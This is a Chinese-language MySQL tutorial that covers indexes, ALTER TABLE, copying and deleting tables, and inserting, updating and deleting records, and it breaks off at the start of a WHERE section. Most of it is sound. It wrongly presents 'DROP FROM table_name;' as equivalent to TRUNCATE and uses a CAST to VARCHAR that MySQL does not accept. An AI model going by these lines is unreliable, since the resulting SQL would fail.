<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tablename </span><br><span class="line">MODIFY columnname1 <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>,</span><br><span class="line">MODIFY columnname2 <span class="type">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;default_value&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们更改了”tablename”表中”columnname1”和”columnname2”字段的默认值。</p>
<p>注意，不能为NOT NULL的字段设置默认值为NULL。对于字符串类型的字段，默认值需要用引号引起来。对于日期和时间类型的字段，可以将默认值设置为CURRENT_TIMESTAMP。</p>
<h3 id="索引（创建、删除、查看、主键索引、唯一索引、全局索引）"><a href="#索引（创建、删除、查看、主键索引、唯一索引、全局索引）" class="headerlink" title="索引（创建、删除、查看、主键索引、唯一索引、全局索引）"></a>索引（创建、删除、查看、主键索引、唯一索引、全局索引）</h3><p>在MySQL中，索引是用来加速查询操作的一种数据结构。它们可以让数据库引擎快速找到表中的特定记录。如果事先在表上创建了索引，查找时就不需要对全表进行扫描，而是利用索引进行扫描。</p>
<p>下面是一些关于MySQL索引的基础知识：</p>
<ol>
<li><p><strong>创建索引：</strong> 创建索引可以使用 <code>CREATE INDEX</code> 命令。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> INDEX index_name</span><br><span class="line"><span class="keyword">ON</span> table_name (column1, column2);</span><br></pre></td></tr></table></figure>

<p>在上面的命令中，<code>index_name</code> 是索引的名称，<code>table_name</code> 是你要在其上创建索引的表的名称，<code>column1</code> 和 <code>column2</code> 是你想在其中创建索引的列。</p>
</li>
<li><p><strong>删除索引：</strong> 删除索引可以使用 <code>DROP INDEX</code> 命令。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> INDEX index_name <span class="keyword">ON</span> table_name;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看索引：</strong> 如果你想看一个表的所有索引，可以使用 <code>SHOW INDEX</code> 命令。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>主键索引：</strong> 主键（PRIMARY KEY）自动创建唯一索引。每个MySQL表只能有一个主键。</p>
</li>
<li><p><strong>唯一索引：</strong> 唯一索引（UNIQUE INDEX）不允许任何重复值。它们可以是主键，也可以不是。</p>
<p>唯一索引（Unique Index）的设置：</p>
<ul>
<li><p>在创建表时定义唯一索引：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">  column1 data_type,</span><br><span class="line">  column2 data_type,</span><br><span class="line">  <span class="keyword">UNIQUE</span> INDEX index_name (column1)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
<li><p>在已存在的表上添加唯一索引：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> INDEX index_name (column1);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>全文索引：</strong> 全文索引（FULLTEXT INDEX）用于全文搜索。只有CHAR、VARCHAR和TEXT列可以创建全文索引。</p>
</li>
</ol>
<p>使用索引的缺点：</p>
<ol>
<li>会占用额外的磁盘空间</li>
<li>在执行插入、更新或删除操作时，索引也需要被更新，有耗时</li>
<li>如果被创建索引的列中重复值较多，即使在该列上创建索引也不会提高处理速度</li>
</ol>
<h2 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h2><p>在MySQL中，你可以使用<code>ALTER TABLE</code>语句来修改已经存在的表。使用ALTER TABLE命令修改列的结构，根据修改类型，可以使用带有CHANGE、MODIFY、ADD、DROP的语句。</p>
<p>以下是一些常见的表修改操作：</p>
<ol>
<li><p><strong>添加列：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> column_name datatype;</span><br></pre></td></tr></table></figure>

<p>例如，如果你想在<code>students</code>表中添加一个名为<code>address</code>的新列，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">ADD</span> address <span class="type">VARCHAR</span>(<span class="number">255</span>);</span><br></pre></td></tr></table></figure>

<p>把列添加到指定位置的命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD 列名 数据类型 AFTER 放在这个列之后;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE tb1 ADD birth DATETIME AFTER employeeId;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>删除列：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> column_name;</span><br></pre></td></tr></table></figure>

<p>例如，如果你想从<code>students</code>表中删除<code>address</code>列，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> address;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>修改列的数据类型：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line">MODIFY <span class="keyword">COLUMN</span> column_name datatype;</span><br></pre></td></tr></table></figure>

<p>即使数据类型不变，也依然需要指定修改后的数据类型</p>
<p>例如，如果你想修改<code>students</code>表中<code>age</code>列的数据类型为<code>SMALLINT</code>，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line">MODIFY <span class="keyword">COLUMN</span> age <span class="type">SMALLINT</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>重命名列：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line">CHANGE <span class="keyword">COLUMN</span> old_column_name new_column_name datatype;</span><br></pre></td></tr></table></figure>

<p>例如，如果你想将<code>students</code>表中的<code>email</code>列重命名为<code>email_address</code>，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students</span><br><span class="line">CHANGE <span class="keyword">COLUMN</span> email email_address <span class="type">VARCHAR</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>

<p>即使数据类型不变，也依然需要指定修改后的数据类型</p>
</li>
<li><p><strong>添加唯一键、主键或索引：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> (column_name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY (column_name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> INDEX index_name (column_name);</span><br></pre></td></tr></table></figure>

<p><code>ALTER TABLE</code>语句会锁定表，直到操作完成。</p>
</li>
</ol>
<h2 id="显示表结构"><a href="#显示表结构" class="headerlink" title="显示表结构"></a>显示表结构</h2><p>ESC或者DESCRIBE，用于显示指定表的列结构，包括列名、数据类型、是否允许NULL，以及其他关于列的信息。</p>
<p>运行这个命令会返回以下信息：</p>
<ul>
<li><strong>Field</strong>：列的名称。</li>
<li><strong>Type</strong>：列的数据类型和长度。</li>
<li><strong>Null</strong>：如果列可以包含NULL值，这个字段会显示”YES”，否则显示”NO”。</li>
<li><strong>Key</strong>：如果列是某种键，这个字段会显示键的类型。”PRI”表示主键，”UNI”表示唯一键，”MUL”表示这个列是一个非唯一索引，或者这个列是多个列的一部分，这些列作为复合主键或复合索引，也可能是外键。</li>
<li><strong>Default</strong>：列的默认值。如果没有指定默认值，这个字段会显示NULL。</li>
<li><strong>Extra</strong>：其他的额外信息，例如，如果列被定义为AUTO_INCREMENT，这个字段就会显示”AUTO_INCREMENT”。</li>
</ul>
<p>，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESC 表名;</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="operator">|</span> Field <span class="operator">|</span> Type         <span class="operator">|</span> <span class="keyword">Null</span> <span class="operator">|</span> Key <span class="operator">|</span> <span class="keyword">Default</span> <span class="operator">|</span> Extra          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+----------------+</span></span><br><span class="line"><span class="operator">|</span> id    <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>)      <span class="operator">|</span> <span class="keyword">NO</span>   <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span> auto_increment <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">100</span>) <span class="operator">|</span> YES  <span class="operator">|</span>     <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------------+------+-----+---------+----------------+</span></span><br></pre></td></tr></table></figure>

<h2 id="查看创建表的SQL语句"><a href="#查看创建表的SQL语句" class="headerlink" title="查看创建表的SQL语句"></a>查看创建表的SQL语句</h2><ol>
<li>SHOW CREATE TABLE语句</li>
</ol>
<p>SHOW CREATE TABLE语句可用于查看创建表的SQL语句，包括所有列、键和约束：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE TABLE table_name;</span><br></pre></td></tr></table></figure>

<p>返回结果示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `employee` (</span><br><span class="line">  `id` int NOT NULL,</span><br><span class="line">  `emp_id` char(10) DEFAULT NULL,</span><br><span class="line">  `emp_name` varchar(10) DEFAULT NULL,</span><br><span class="line">  `manager_id` char(10) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br></pre></td></tr></table></figure>

<h2 id="复制表"><a href="#复制表" class="headerlink" title="复制表"></a>复制表</h2><p>在MySQL中，你可以通过创建新表并从现有表中复制数据来复制表。下面是一种方法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> new_table <span class="keyword">AS</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> existing_table;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>new_table</code>是你想要创建的新表的名称，<code>existing_table</code>是你想要复制数据的现有表的名称。这个操作将创建一个新表，并将现有表中的所有数据复制到新表中。</p>
<p>需要注意的是，使用这种方法创建的新表不会包含现有表的索引、主键、唯一键和其他约束。如果你需要复制这些属性，你需要使用其他方法，例如先使用<code>CREATE TABLE</code>语句创建表和相应的约束，然后使用<code>INSERT INTO ... SELECT</code>语句复制数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> new_table <span class="keyword">LIKE</span> existing_table; </span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> new_table <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> existing_table;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>CREATE TABLE new_table LIKE existing_table;</code>语句创建一个与现有表结构（包括索引和约束）完全相同的新表，但不包含任何数据。然后，<code>INSERT INTO new_table SELECT * FROM existing_table;</code>语句将现有表中的所有数据复制到新表中。</p>
<h2 id="复制符合条件的记录"><a href="#复制符合条件的记录" class="headerlink" title="复制符合条件的记录"></a>复制符合条件的记录</h2><p>当另一个表已经存在时，可以使用 <code>INSERT INTO SELECT</code> 语句来从一个表复制符合条件的记录到另一个表中。具体来说，<code>INSERT INTO SELECT</code> 语句会将一个查询结果插入到指定的表中。</p>
<p>以下是一个使用 <code>INSERT INTO SELECT</code> 语句复制符合条件的记录的示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO newtable (col1, col2, ...)</span><br><span class="line">	SELECT col1, col2, ...</span><br><span class="line">FROM oldtable</span><br><span class="line">	WHERE condition;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们把符合查询条件的列数据从旧表 oldtable 复制到新表 newtable。选择需要复制的列，并通过 WHERE 子句指定要复制的特定行。</p>
<p>需要注意的是，在执行 INSERT INTO SELECT 语句之前，我们必须先创建新表，并保证它与旧表拥有相同的结构。此外，也可以为新表添加索引或其他约束，以确保数据完整性和查询性能。</p>
<p>还可以在 <code>SELECT</code> 语句中使用 JOIN、GROUP BY、HAVING 等功能来实现更加复杂的查询操作。例如，我们可以使用 <code>JOIN</code> 连接多个表，并根据多个条件对记录进行筛选，最终将满足条件的记录插入到新表中。</p>
<p>如果需要将一个表中符合条件的记录复制到一个新表中，并且该表不存在，可以使用以下语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE newtable</span><br><span class="line">	SELECT col1, col2, ...</span><br><span class="line">FROM oldtable</span><br><span class="line">	WHERE condition;</span><br></pre></td></tr></table></figure>

<p>这条 <code>CREATE TABLE AS</code> 语句会首先创建一个名为 newtable 的新表，然后将满足 WHERE 子句指定的条件的所有行从 oldtable 复制到新表中。</p>
<p>需要注意的是，新表的列会自动继承 SELECT 列出的列的名称和数据类型。如果需要重新命名列或更改其数据类型，则可以使用 <code>AS</code> 或其他列定义语法来修改列属性。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE newtable</span><br><span class="line">	SELECT id AS new_id, name, CAST(age AS VARCHAR(10)) AS age_str</span><br><span class="line">FROM oldtable</span><br><span class="line">	WHERE condition;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们在 SELECT 语句中为新表定义了新的列名和数据类型，并将旧表的 id 列重命名为 new_id。最终，MySQL 将会根据 SELECT 语句的结果集自动创建新表的结构，并将所有符合条件的记录插入到新表中。</p>
<p>总而言之，<code>CREATE TABLE AS</code> 是一个强大的功能，它可以帮助我们快速创建一个新表并复制符合特定条件的记录。无论是用于数据备份、数据迁移还是进行数据分析，都是非常有用的工具。</p>
<h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><p>在MySQL中，你可以使用 <code>DROP TABLE</code> 语句来删除已经存在的表。以下是其基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>table_name</code> 是你想要删除的表的名称。例如，如果你想删除名为 <code>students</code> 的表，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> students;</span><br></pre></td></tr></table></figure>

<p>此外，在目标表不存在的情况下执行DROP命令会发生错误，如果和<code>IF EXISTS</code>子句一起使用，就可以避免在试图删除不存在的表时出现错误。下面是如何使用它的语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> table_name;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>table_name</code>是你想要删除的表的名称。例如，如果你想删除名为<code>students</code>的表，你可以这样做：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> students;</span><br></pre></td></tr></table></figure>

<p>如果<code>students</code>表存在，上述语句将删除它。如果<code>students</code>表不存在，MySQL将发出一条警告，而不是一个错误，并允许查询继续。</p>
<h2 id="删除所有记录"><a href="#删除所有记录" class="headerlink" title="删除所有记录"></a>删除所有记录</h2><p>请注意，<code>DROP TABLE</code> 语句会永久删除表以及表中的所有数据，因此在使用之前请确保你真的想要删除该表。如果你只是想删除表中的所有数据，但是想保留表的结构（例如列的定义和约束），你应该使用 <code>TRUNCATE TABLE</code> 语句，在MySQL中，<code>TRUNCATE</code>是一个DDL（数据定义语言）语句，用于删除表中的所有记录如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> table_name;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>TRUNCATE TABLE students;</code> 会删除 <code>students</code> 表中的所有数据，但是表本身和其结构仍然存在。</p>
<p>或者使用如下命令也可以达到同样的效果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP FROM table_name;</span><br></pre></td></tr></table></figure>

<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 列名1, 列名2... FROM 表名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表名;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;会将这段文字输出&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT (1+2)*3;</span><br></pre></td></tr></table></figure>

<h2 id="插入记录"><a href="#插入记录" class="headerlink" title="插入记录"></a>插入记录</h2><p>在MySQL中，可以使用<code>INSERT INTO</code>语句向表中插入数据。以下是几个例子：</p>
<ol>
<li><p><strong>插入完整的行数据：</strong></p>
<p>在这种情况下，你需要提供表中每个列的值。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2, column3, ...)</span><br><span class="line"><span class="keyword">VALUES</span> (value1, value2, value3, ...);</span><br></pre></td></tr></table></figure>

<p>例如，如果你有一个名为<code>students</code>的表，它有<code>id</code>, <code>name</code>, <code>age</code>, <code>email</code>四个列，你可以这样插入数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students (id, name, age, email)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;John Doe&#x27;</span>, <span class="number">20</span>, <span class="string">&#x27;johndoe@example.com&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注意：如果你的表有一个设置了<code>AUTO_INCREMENT</code>的列（如<code>id</code>列），你可以在插入数据时省略该列，MySQL会自动为它分配一个值。</p>
</li>
<li><p><strong>插入特定列的数据：</strong></p>
<p>在这种情况下，你只需要提供你想插入的列的值。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2, ...)</span><br><span class="line"><span class="keyword">VALUES</span> (value1, value2, ...);</span><br></pre></td></tr></table></figure>

<p>例如，如果你只想插入<code>students</code>表中的<code>name</code>和<code>email</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students (name, email)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;John Doe&#x27;</span>, <span class="string">&#x27;johndoe@example.com&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>插入多行数据：</strong></p>
<p>你可以一次插入多行数据，只需在<code>VALUES</code>关键字后面列出所有的值。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2, ...)</span><br><span class="line"><span class="keyword">VALUES</span> </span><br><span class="line">(value1, value2, ...),</span><br><span class="line">(value1, value2, ...),</span><br><span class="line">...</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students (name, email)</span><br><span class="line"><span class="keyword">VALUES</span> </span><br><span class="line">(<span class="string">&#x27;John Doe&#x27;</span>, <span class="string">&#x27;johndoe@example.com&#x27;</span>),</span><br><span class="line">(<span class="string">&#x27;Jane Doe&#x27;</span>, <span class="string">&#x27;janedoe@example.com&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h2><p>在MySQL中，你可以使用<code>UPDATE</code>语句来更新已经存在的记录。以下是其基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name</span><br><span class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>table_name</code>是你想要更新记录的表的名称，<code>column1</code>, <code>column2</code>, … 是你想要更新的列的名称，<code>value1</code>, <code>value2</code>, … 是你想设置的新值，<code>condition</code>是用于确定哪些记录应该被更新的条件。如果没有使用WHERE设置条件，列中的所有记录都会被替换掉，为防止这种情况发生，在启动MySQL监视器的时候，可以加上–safe-update选项，使用此选项后，如果没有WHERE条件就无法执行UPDATE或DELETE。</p>
<p>以下是一个例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> students</span><br><span class="line"><span class="keyword">SET</span> age <span class="operator">=</span> <span class="number">21</span>, email <span class="operator">=</span> <span class="string">&#x27;newemail@example.com&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;John Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这个语句会在<code>students</code>表中找到所有名字为<code>John Doe</code>的记录，并将它们的<code>age</code>列设置为21，<code>email</code>列设置为<code>newemail@example.com</code>。</p>
<p>请注意，如果你省略了<code>WHERE</code>子句，<code>UPDATE</code>语句将更新表中的所有记录。因此，除非你真的想更新所有记录，否则应始终在使用<code>UPDATE</code>语句时包含<code>WHERE</code>子句。</p>
<p>另外，你应该谨慎使用<code>UPDATE</code>语句，因为一旦记录被更新，你就不能撤销更改。在更新重要的表之前，你应该考虑备份数据。</p>
<h2 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h2><p>在 MySQL 中，可以使用 <code>DELETE</code> 语句删除表中的记录。以下是一些常见的用法和语法：</p>
<ol>
<li>删除整个表中的所有记录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name;</span><br></pre></td></tr></table></figure>

<p>这条语句将会从表 <code>table_name</code> 中删除所有记录。需要注意的是，<code>DELETE</code> 操作无法撤销，因此务必谨慎地使用。</p>
<ol start="2">
<li>删除符合条件的记录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM table_name WHERE condition;</span><br></pre></td></tr></table></figure>

<p>这条语句将会从表 <code>table_name</code> 中删除满足指定条件的记录。例如，我们可以将下面的语句用于删除年龄大于 30 岁的人员信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM person WHERE age &gt; 30;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>删除部分符合条件的记录</li>
</ol>
<p>有时候，我们可能只想删除表中的前几行数据，或者只删除满足某些条件的前几行数据。可以使用 <code>LIMIT</code> 子句来限制待删除的记录数。例如，以下语句将会删除表 <code>person</code> 中前 10 行记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM person LIMIT 10;</span><br></pre></td></tr></table></figure>

<p>如果要删除符合条件的前 10 行数据，则可以如下写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM person WHERE age &gt; 30 ORDER BY id LIMIT 10;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们选择指定了 <code>WHERE</code> 条件和排序方式，并使用 <code>LIMIT</code> 限制了最多删除 10 行记录。</p>
<h1 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h1><h2 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h2><p>在MySQL中，<code>WHERE</code>子句用于在查询中指定条件，以过滤出满足特定条件的记录。以下是<code>WHERE</code>子句的基本语法：</p>
